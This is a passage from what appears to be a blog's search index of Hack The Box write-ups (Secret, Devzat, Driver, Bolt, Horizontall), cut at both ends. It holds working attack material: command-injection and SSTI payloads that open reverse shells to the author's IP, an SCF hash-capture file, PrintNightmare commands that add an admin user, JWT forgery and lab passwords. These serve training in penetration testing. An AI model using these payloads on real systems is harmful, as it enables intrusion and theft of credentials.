SET GLOBAL wsrep_provider=\"/dev/shm/CVE-2021-27928.so\";\r","date":"2022-04-01","objectID":"/posts/linux-machines/2022-04-01-shibboleth/:0:0","tags":["Hackthebox","ipmi","maria-DB","zabbix"],"title":"Shibboleth Hackthebox writeup","uri":"/posts/linux-machines/2022-04-01-shibboleth/"},{"categories":["Linux Machines"],"content":"In this Box we are going to follow documentation instructions to create a new user , will face sensitive data exposure will let us see a delete commit ,this will help us change our token to the admin token and login as admin , reading source codes we find a command injection so we will have a reverse shell as a user, for the root part there is a suid binary that can read any file on the system and count it , and in the source code it has PR_SET_DUMPABLE so we can dump it if it receives a signal while running ,we will send segmentation fault signal and dump the process then performing strings on the dump we can read the root ssh private key and login as root Scanning : nmap -A -T4 10.10.11.120 -oN nmap.txt PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA) | 256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA) |_ 256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: DUMB Docs 3000/tcp open http Node.js (Express middleware) |_http-title: DUMB Docs Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rEnumerating : we can Follow the documentation guide to register a user : so we can try : curl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{\"name\": \"MESBAHA\",\"email\": \"test@testers.com\",\"password\": \"hecker\"}'\rand this is the expected response for a successful registration as we see in the Documentation now we want to login with this user , we can check the documentation : curl -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json' -d '{\"email\": \"test@testers.com\",\"password\": \"hecker\"}'\rand this means we login successfully as documentation tells us : now we can also see we can try access private route : providing our token in the host header and making a get request : curl -H \"auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoiTUVTQkFIQSIsImVtYWlsIjoidGVzdEB0ZXN0ZXJzLmNvbSIsImlhdCI6MTY0ODI4NjQ1MH0.qw4zy4hLWs95jH4y09sEcgOFPxDtOEWaw9Xv_E5ZpOg\" http://10.10.11.120/api/priv\rso now we want to elevate to admin , we need to provide the admin token to login as admin rule. we can see at the main page we can download the source-codes maybe downloading the source codes can reveal more information to us wget http://10.10.11.120/download/files.zip unzip files.zip\rand we can see it is a git repository , we can check the logs to see if the owner deleted something recently. git log\rand this log seems interesting , if we read the current .env DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web' TOKEN_SECRET = secret\rit contains the environment variables , there are very common mistakes can happen at this file like providing username and password at the connect variable or releasing secret tokens. we can follow this path and see the previous version of .env git show 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78\rnow we have the secret , we can go to jwt.io providing our token and the secret we can modify the name to admin. if we change it to admin it won’t work , back to the Documnetation we will see admin name is “theadmin” now moidify our token : we can now use this token to request the /priv again curl -H \"auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjNlZGEzZTQ0NWI1YzA0NWM2MzRlMTgiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InRlc3RAdGVzdGVycy5jb20iLCJpYXQiOjE2NDgyODY0NTB9.V0Sp_hlU1cYAZ_tYZ3_vHJuQ2saLfoiaxPrzZssD2-E\" http://10.10.11.120/api/priv\rnow what ðŸ˜‚? we can check the source code for the private route under local-web/routes/private.js if we make a get request as admin to /logs with parameter file it will execute command : git log --oneline ${file}\rwe can try see if it works : and it is working , we can try some command injection here : curl -H \"auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6I","date":"2022-03-26","objectID":"/posts/linux-machines/2022-03-26-secret/:0:0","tags":["Hackthebox","API","JWT","SUID","core-dump"],"title":"Secret Hackthebox writeup","uri":"/posts/linux-machines/2022-03-26-secret/"},{"categories":["Linux Machines"],"content":"Analyzing the code we can see the file we supply will be loaded , then the function will count it line by line and word by word,..etc we can also see this comment and this code line : this seems irregular to me prctl(PR_SET_DUMPABLE, 1);\rchecking prctl() manual here we can find : hence it is set to 1 in our case this means we can dump it if it receives a signal like “interrupt” while it is running so we will get another reverse shell on another port in shell-1 : run the binary and specify the file you want in shell-2 : kill the process ex: kill -SIGSEGV 1718 now as we have dumped it where is the dumps ? , reading here it should be at /var/crash shell -1 : shell -2 : get PID from the ps aux command and we see our dump : reading here to know what to do with a .crash file apport-unpack _opt_count.1000.crash /tmp/dumps\rnow perform strings on CoreDump ","date":"2022-03-26","objectID":"/posts/linux-machines/2022-03-26-secret/:0:1","tags":["Hackthebox","API","JWT","SUID","core-dump"],"title":"Secret Hackthebox writeup","uri":"/posts/linux-machines/2022-03-26-secret/"},{"categories":["Linux Machines"],"content":"Root Access Hence we Have port 22 open ,now save the id_rsa and : chmod 600 id_rsa ssh root@10.10.11.120 -i id_rsa\r","date":"2022-03-26","objectID":"/posts/linux-machines/2022-03-26-secret/:1:0","tags":["Hackthebox","API","JWT","SUID","core-dump"],"title":"Secret Hackthebox writeup","uri":"/posts/linux-machines/2022-03-26-secret/"},{"categories":["Linux Machines"],"content":"In this Hackthebox we will get a user access through a command injection in a vhost , then will make port forwarding to find a service that will give us the password for another user who have access to some backups, in this backups we can find the source-code for a bot , the bot has 2 versions one of them is running locally and it has a command “file” which allows us to read any file on the sytsem we will make port forwarding one more time to read the root private key and login as root Scanning : i will start with basic scanning : nmap -A -T 4 -sV 10.10.11.118 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c2:5f:fb:de:32:ff:44:bf:08:f5:ca:49:d4:42:1a:06 (RSA) | 256 bc:cd:e8:ee:0a:a9:15:76:52:bc:19:a4:a3:b2:ba:ff (ECDSA) |_ 256 62:ef:72:52:4f:19:53:8b:f2:9b:be:46:88:4b:c3:d0 (ED25519) 80/tcp open http Apache httpd 2.4.41 |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://devzat.htb/ 8000/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-Go | ssh-hostkey: |_ 3072 6a:ee:db:90:a6:10:30:9f:94:ff:bf:61:95:2a:20:63 (RSA)\rand we can see devzat.htb at the scan result so we can add it to the /etc/hosts and start fuzzing vhosts. ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://devzat.htb -H \"Host: FUZZ.devzat.htb\" -fc 302,404 pets [Status: 200, Size: 510, Words: 20, Lines: 21]\rwe can add pets.devzat.htb also to the /etc/hosts Enumeration : ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:0:0","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Discovery we can start enumerating the devzat.htb web application first. we can see it talks about some chat application and can try it with : so we can try it using : ssh -l Mesbaha devzat.htb -p 8000\rlooking for help to know how to use it : okay we will check it latter after we finish discovery phase visiting pets.devzat.htb we have the option to add new item we can also see how the request is sent : okay now we have some leads , we can also start directory busting to check if there is something interesting ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:0:1","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Directory Busting dirsearch -u http://devzat.htb/ -w /usr/share/wordlists/dirb/common.txt [06:55:30] 301 - 309B - /assets -\u003e http://devzat.htb/assets/ [06:55:35] 301 - 309B - /images -\u003e http://devzat.htb/images/ [06:55:35] 200 - 6KB - /index.html [06:55:35] 301 - 313B - /javascript -\u003e http://devzat.htb/javascript/ [06:55:40] 403 - 275B - /server-status\rdirsearch -u http://pets.devzat.htb/ -w /usr/share/wordlists/dirb/common.txt [06:58:36] 200 - 23B - /.git/HEAD [06:58:39] 301 - 42B - /build -\u003e /build/ [06:58:40] 301 - 40B - /css -\u003e /css/ [06:58:48] 403 - 280B - /server-status\rthis /.git seems worthy to check we need to download all of this and check them wget -r http://pets.devzat.htb/.git/\ronce i am introduced with a .git i always use GitTools to make the enumeration easier. i will start with the extractor to see broken repository commits and incompleted commits. ./extractor.sh pets.devzat.htb pets.dump\rand we have these 3 commits : 0-ef07a04ebb2fc92cf74a39e0e4b843630666a705 1-8274d7a547c0c3854c074579dfc359664082a8f6 2-464614f32483e1fde60ee53f5d3b4d468d80ff62\rwe can run the tree command to have an overview look , we will see a main.go in all the folders we can take a look at it and will find : it seems the “species” attribute which we sent in the pets.devzat.htb is not filtered before being passed to exec.Command we can try some command injection and see if it works Foothold at the pets.devzat.htb page we can now try to add an item again but this time we will try to ping our host: {\"name\":\"pingme\",\"species\":\"cat;ping -c 4 10.10.16.106\"}\rnice we got a reply , now Let’s have a reverse shell ! however when i tried sh -i \u003e\u0026 /dev/tcp/10.10.16.106/9090 0\u003e\u00261 it doesn’t return a connection back so i though maybe the spaces and special characters are the reason . echo \"sh -i \u003e\u0026 /dev/tcp/10.10.16.106/9090 0\u003e\u00261\" | base64 c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTA2LzkwOTAgMD4mMQo=\rand finally : spawn a tty shell: python3 -c \"import pty;pty.spawn('/bin/bash')\" ctrl+z stty raw -echo ;fg Enter key x2 export TERM=xterm\rand we have a nice shell as patrick user on the machine ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:0:2","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Enumerating the machine at the /etc/passwd we can see this strange backup backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\rwe can visit this /var/backups/ maybe it contains useful information can help us escalate our privilege But only user catherine can use it so we should find a way to escalate to this user first :( -rw------- 1 catherine catherine 28297 Jul 16 2021 devzat-dev.zip\r-rw------- 1 catherine catherine 27567 Jul 16 2021 devzat-main.zip\rif we run ss-lpnut tcp 0 0 127.0.0.1:5000 0.0.0.0:* LISTEN 836/./petshop tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8086 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:8443 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::8000 :::* LISTEN 837/./devchat\rwe can see port 8443 and port 8086 are running locally , and there is no netcat on the machine to know what are the services running. so we have to make port forward to see the ports running. ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:1:0","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"port forward forward port 8086 from the machine to your side. first: generate ssh keys ssh-keygen -f devzat\rand put your public key at the authorized_keys on the machine side Second: forward the port : # at your side ssh -i devzat -N -L 8086:127.0.0.1:8086 patrick@devzat.htb\rnow if we have scanned our localhost will find : if we search for this version of the service will find immediatley this exploit and we can see the user catherine shows up with this password : woBeeYareedahc7Oogeephies7Aiseci now we can switch to user catherine easily : Root access: now as we are logged in as the user catherine we can check the /var/backups which we can’t access earlier. download them at our machine first : after we unzip them we can see they have exact same files , so we can check if there are any difference between the content diff main/commands.go dev/commands.go\r\u003c commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode} --- \u003e commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file} \u003e }\rand we can the option “file” , if we read the source code we will find : file = commandInfo{\"file\", \"Paste a files content directly to chat [alpha]\", fileCommand, 1, false, nil}\rand will find : but if we tried the connection command will see the command /file doesn’t exist :( ssh -l mesbah devzat.htb -p 8000\rwe can read other codes under the dev file we have and will find at “devchat.go” this port is running locally we can forward it then connect to the bot : # at your side : ssh -i devzat -L 8443:127.0.0.1:8443 -N patrick@devzat.htb\rthen connect to the bot : ssh -l mesbah 127.0.0.1 -p 8443\rnow we can read the root.txt , or we can read the /root/.ssh/id_rsa to gain the root access ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:1:1","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Linux Machines"],"content":"Pwned ","date":"2022-03-11","objectID":"/posts/linux-machines/2022-03-11-devzat/:2:0","tags":["Hackthebox","rce","Port forwarding"],"title":"Devzat Hackthebox writeup","uri":"/posts/linux-machines/2022-03-11-devzat/"},{"categories":["Windows Machines"],"content":"In this Box, we are going to abuse the ability of uploading the firmware of a shared printer and capture the NTLMv2 hash of a user on this machine. By cracking the hash there is nothing that can stop us from logging in except the smb shares aren’t accessible so we will use evil-winrm to get the initial access, for the Administrator part we will make use of the vulnerable service “spooler” and add a user in the administrator group. ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:0:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Scanning : nmap -T 4 -A -sV 10.10.11.106 -oN nmap_intial.txt\routput : PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ Basic realm=MFP Firmware Update Center. Please enter password for admin | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn\\'t have a title (text/html; charset=UTF-8). 135/tcp open msrpc Microsoft Windows RPC 445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h17m43s, deviation: 0s, median: 7h17m43s | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required\rwe can also run full port scan and will get : PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 445/tcp open microsoft-ds 5985/tcp open wsman\rwe have this port 5985 open , which we may utilize later check. ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:1:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Enumeration: we can start by visiting the web page and it will ask us for a username:password for MFP firmware update center . searching for MFP will find it stands for multi functioning printer , we can search for default credentials and find it is “admin:admin” using them will login successfully : we can add “driver.htb” to the /etc/hosts and start fuzzing for any Vhosts but will find none. let’s navigate around this site will find option Firmware Updates is working and asking for updating firmware we should now think about uploading some malicious file to gain a reverse shell , however it won’t work. we can enumerate SMB that we have found earlier maybe will give us a lead ACCESS_DENIED from smbclient -L //driver.htb it seems SMB is running for the printer that is shared among the network ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:2:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"SMB authentication : according to Microsoft Documentation : NTLM and the older LAN Manager (LM) encryption are supported by Microsoft SMB Protocol. Both encryption methods use challenge-response authentication, where the server sends the client a random string and the client returns a computed response string that proves the client has sufficient credentials for access.\rso if the client (the target) tries to connect to us (attacker) the NTLM hash will be used to authenticate and then we can capture it with Responder tool. and as the firmwares are checked when the file we upload is loaded at the reviewer file explorer or if he clicked it we can get the hash we need. ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:2:1","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Exploitation : searching for “smb share and printer firmware update exploit” will find this blog here so creating the payload : [Shell] Command=2 IconFile=\\\\\u003cip\u003e\\share\\Mesbaha.ico [Taskbar] Command=ToggleDesktop\rand name it as \"@hack.scf\" and before uploading it run Responder to capture the hash (hopefully): sudo responder -I tun0 -rdwv\rGREAT we have NTLMv2 hash now : now we can try to crack it with hashcat : hashcat -m 5600 tony_hash /usr/share/wordlists/rockyou.txt\rso we have username and password , now How can we login ? ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:2:2","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Foothold : Most of the impacket tools that takes username:password and try to login depends on SMB shares (i.e : ADMIN$ and C$) and hence they are not accessible they won’t work . Remember the port we have found in the full port scan ? reading the blog article i have mentioned above If WinRM is enabled on the machine, it's trivial to remotely administer the machine from PowerShell. In fact, you can just drop in to a remote PowerShell session on the machine (as if you were using SSH!)\rand they mentioned tool : evil-winrm that can help us do this ./evil-winrm.rb -u tony -p liltony -i driver.htb\rand the user.txt is in tony’s Desktop ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:3:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Privilege escalation : you can start uploading Winpeas and follow the output but i will try first some manual checks first we know this Box is about printers and drivers maybe we find some exploit that way in the Microsoft post is says we can run Get-Service -Name Spooler to check if it is running , and it is running Hence the service is running indeed we can try to exploit it and see if it works , there is this great one here that we can try we can try to upload it then it will add for us a new user in Administrator group from machine side we can download the script from our http server with : note make sure you are in a writable directory Invoke-WebRequest -Uri http://10.10.16.4:8888/CVE-2021-34527.ps1 -OutFile CVE.ps1\rrunning the exploit : Import-Module .\\CVE.ps1 Invoke-Nightmare -NewUser \"0xMesbaha\" -NewPassword \"supersecretpassword123\"\rand our new user has been added we can try to login with “evil-winrm” as well : and if we run net user \u003cuser_added\u003e will find : the root flag is at Administrator Desktop . ","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:4:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Windows Machines"],"content":"Pwned","date":"2022-02-25","objectID":"/posts/windows-machines/2022-02-25-driver/:5:0","tags":["Hackthebox","print nigthmare","scf attacks","evil-winrm"],"title":"Driver Hackthebox writeup","uri":"/posts/windows-machines/2022-02-25-driver/"},{"categories":["Linux Machines"],"content":"In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost “demo” which has some functions aren’t in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password . ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:0:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Scanning : $ nmap -A -T 4 $IP -sV -oN nmap/intial PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rif we do a full port scan it won’t return any new ports so now we can start our enumeration process. we can notice from the nmap scan commonName=passbolt.bolt.htb so we can add bolt.htb and pass.bolt.htb to our /etc/hosts we can also search for other potential vhosts now : ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb -H \"Host: FUZZ.bolt.htb\" -fw 10870 mail [Status: 200, Size: 4943, Words: 345, Lines: 99] demo [Status: 302, Size: 219, Words: 22, Lines: 4]\rwe can add them all to the /etc/hosts as well ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:1:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Enumeration : visiting the web application at bolt.htb or passbolt.bolt.htb we are introduced with : there is a feedback form at the end but it doesn’t work we can start viewing the pages at the application : at /download there is a file we can download so let’s download it and see what it contains extracting the image.tar we can see it contains : each directory contains a layer.tar file , we can utilize some bash magic to extract them all : #!/usr/bin/bash for file in $( ls -d */) do tar -xf $file/layer.tar -C $file/ done\rnow we can use tree command to have an overview what does the files contains then we can start checking them manually at 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/ will find a config.py file reading it will find : and it loads db.sqlite3 we can start searching for it in all image layers maybe we find it and we did : # under img dir find . -name db.sqlite3 ./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3\rnow we can open it and will find : admin@bolt.htb:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.\rwe can try to crack this hash with JTR : john --wordlist=/usr/share/wordlists/rockyou.txt admin@bolt.htb_hash # password:deadbolt\rgreat we have credentials we can try to login at the web application with it and we are in: let’s see where else we can utilize these valid credentials , we can visit mail.bolt.htb but it didn’t work :( . we can also visit demo.bolt.htb and it also doesn’t work however it contains a registration function : it needs a ticket to create an account navigating through img files will see at 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/ some source codes we can check routes.py and we will see : seems like invitation code we can try to register at demo.bolt.htb with it . we create account successfully and can login with it : we can also login to mail.bolt.htb with our new credentials , they seem to be connected somehow ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:2:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Enumeration Harder now as we are logged in in all the web applications we should have notice that demo.bolt.htb and bolt.htb are pretty much the same however in the demo there are more features and pages we can access . we now are searching for any input at any page to test it at demo and under profile page we have this setting tab which has input option : we can test it and instantly at mail.bolt.htb an email has received and when we pressed the link another mail has received : so now we have understood how the web applications function together we can test these input fields for potential vulnerabilities . we have seen in the source codes “flask” a lot so we can test SSTI . ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:3:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"exploitation : testing SSTI can began with a basic test like : we now will receive first mail to confirm and 2nd one with the response : Nice we have a valid SSTI exploit at the name field , we can try to leverage it to RCE with payload like those {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}\rresponse : so now we can get a reverse shell with : {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc \u003cip\u003e 9999 \u003e/tmp/f').read() }}\r","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:4:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Foothold : and we have our shell as www-data : if we look around we will find a lot of files to explore , we can use Linpeas to guide us where to look first and non expected files in some directories and if there is a path to escalate our privilege . we can check roundcube/config/config.inc.php and will find : which is a potential password we can use latter also there is /etc/passbolt we can check it to search for potential passwords in it we can use : grep --color=auto -rnw '.' -Rie \"password\" --color=always 2\u003e/dev/null # ./passbolt.php:42: 'password' =\u003e 'rT2;jW7\u003ceY8!dX8}pQ8%',\rwe can try to see if we can access the mysql database : passbolt:rT2;jW7\u003ceY8!dX8}pQ8%\rwww-data@bolt:/etc/passbolt$ mysql -u passbolt -D passboltdb -p # mysql\u003e\rand we have connected successfully , we can now see if there is anything interesting for us mysql \u003e SHOW databases ; # list them mysql \u003e use passboltdb; mysql \u003e show tables; # list tables mysql \u003e Describe secrets ; # found table secrets seems interesting\rwill find this PGP message inside the column data of table secrets : so far we didn’t find a potential factor to escalate to eddie or clarck however we have collected some passwords we can test them as ssh credentials with any user . ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:5:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Eddie user : now we can ssh to the eddie user : Back to our linpeas output we had : and he had one mail from clark contains : Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it\rso we should search for this browser to see what is this mail about we can find google-chrome is the browser mentioned now we want to get eddie private key to be able to read the message we have seen before in the MySQL DB . we can start searching for it inside the chrome folder we just hit . eddie@bolt:~/.config/google-chrome$ grep \"PRIVATE KEY\" -r .\rwill find some results just have the header and not the key itself , but will find : Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches\rseems promising , now to grep in a binary you should use “-a” which means all even binaries . and here it is now you can copy it then replace “\\r\\n” with new line and you now have the private key ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:6:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Decrypting the message now to decrypt a PGP encrypted message we will use : $ gpg --import eddie_private $ gpg -d message.inc\rbut it asks for a passphrase to import the gpg key we can utilize gpg2john to get the hash then john to crack it $ gpg2john eddie_private \u003e eddie_key_hash $ john --wordlist=/usr/share/wordlists/rockyou.txt eddie_key_hash\rnow we can decrypt the message : ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:6:1","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"Root Access using the password we just found in the message : Z(2rmxsNW(Z?3=p/9s we get the root access ","date":"2022-02-18","objectID":"/posts/linux-machines/2022-02-18-bolt/:7:0","tags":["Hackthebox","SSTI","PGP Decrypting"],"title":"Bolt Hackthebox writeup","uri":"/posts/linux-machines/2022-02-18-bolt/"},{"categories":["Linux Machines"],"content":"we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh Scanning : to make our life easier will export ip to use the variable $IP instead of re-typing ip $export IP=10.10.11.105\rstarting with a basic scanning : $nmap -sV -v $IP -oN nmap/intial\rPORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx 1.14.0 (Ubuntu)\rwhen try to visit http it can’t be opened which is an indicator we will need to make Vhost enumeration Latter so you need to add it to /etc/hosts ","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:0:0","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"directory Busting : $ gobuster dir -u \"http://horizontall.htb/\" -w /usr/share/wordlists/dirb/common.txt\rresults : /css (Status: 301) [Size: 194] [--\u003e http://horizontall.htb/css/] /favicon.ico (Status: 200) [Size: 4286] /img (Status: 301) [Size: 194] [--\u003e http://horizontall.htb/img/] /index.html (Status: 200) [Size: 901] /js (Status: 301) [Size: 194] [--\u003e http://horizontall.htb/js/]\r","date":"2022-02-04","objectID":"/posts/linux-machines/2022-02-04-horizontall/:0:1","tags":["Hackthebox","Port forwarding","chisel"],"title":"Horizontall Hackthebox writeup","uri":"/posts/linux-machines/2022-02-04-horizontall/"},{"categories":["Linux Machines"],"content":"Vhosts enumeration : $ gobuster vhost -u horizontall.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt\ryou can also use ffuf like this : $ ffuf -w 